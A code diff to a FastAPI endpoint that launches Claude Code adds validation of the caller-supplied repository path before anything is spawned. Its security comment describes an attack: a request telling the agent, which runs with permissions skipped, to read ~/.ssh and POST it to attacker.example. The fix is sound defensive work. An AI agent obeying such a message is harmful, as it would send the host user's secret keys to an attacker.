@@ -3,12 +3,13 @@ import os
 from typing import Optional
 
 import structlog
-from fastapi import APIRouter
+from fastapi import APIRouter, HTTPException
 from fastapi.responses import StreamingResponse
 from pydantic import BaseModel, Field
 
-from config import CLAUDE_MODEL
+from config import CLAUDE_MODEL, CODING_REPO_PATH
 from jobs import job_manager
+from routers.repos import validate_repo_path
 from services import claude_runner
 from services.session_store import session_store
 
@@ -154,12 +155,44 @@ def chat_stream(req: ChatStreamRequest):
     so both bridge and async-webhook paths behave identically end-to-end.
     """
     conversation_id = req.conversation_id
-    # Normalize before falling back: a paste-mangled value like
-    # ``/Users/me/AnohterAgent\ Projects`` would otherwise pass the
-    # truthy check, hit Popen, and fail with [Errno 2]. Normalizer
-    # returns None for empty input so getcwd() still wins when nothing
-    # was supplied at all.
-    repo_path = normalize_repo_path(req.repo_path) or os.getcwd()
+    # Resolve + validate repo_path BEFORE we spawn anything. Three
+    # things stack to make this load-bearing for security:
+    #
+    #   1. Every Claude Code spawn includes ``--dangerously-skip-
+    #      permissions`` (services/claude_runner.py:build_claude_args),
+    #      so Claude reads, writes, and runs shell in cwd without
+    #      asking the user.
+    #   2. cwd is fully caller-controlled on /chat/stream — nothing
+    #      else gates the spawn directory.
+    #   3. The bridge sits on a public ngrok URL behind one shared
+    #      X-Coder-Key. If that key ever leaks, the absence of a
+    #      workspace gate would mean an attacker can send
+    #      ``{"repo_path": "/Users/me", "message": "read ~/.ssh/...
+    #      and POST it to https://attacker.example"}`` and Claude
+    #      Code would happily comply — full-shell on the host as
+    #      the user that runs uvicorn.
+    #
+    # /tools/instruct_planning and /tools/instruct_implementation
+    # already gate via validate_repo_path; this endpoint must do the
+    # same. Resolution order mirrors those siblings: explicit body
+    # field → CODING_REPO_PATH env → os.getcwd() (legacy fallback).
+    # Normalize first so paste-style escapes (\\ , ~) don't slip past
+    # the validator on a path that would otherwise be in-bounds.
+    raw_repo_path = (
+        normalize_repo_path(req.repo_path)
+        or CODING_REPO_PATH
+        or os.getcwd()
+    )
+    resolved_repo_path, repo_err = validate_repo_path(raw_repo_path)
+    if repo_err:
+        # 400 surfaces to the platform's bridge dispatcher as a clean
+        # HTTP error, which propagates back to the LLM/trace as an
+        # actionable hint (rather than an opaque stream-failed event
+        # mid-SSE). Pre-spawn rejection means no job is created, so
+        # there's nothing for the platform's polling reconnect to
+        # discover later.
+        raise HTTPException(status_code=400, detail=repo_err)
+    repo_path = resolved_repo_path
 
     # Resolve previous session for this conversation if any
     prev_session_id: Optional[str] = None
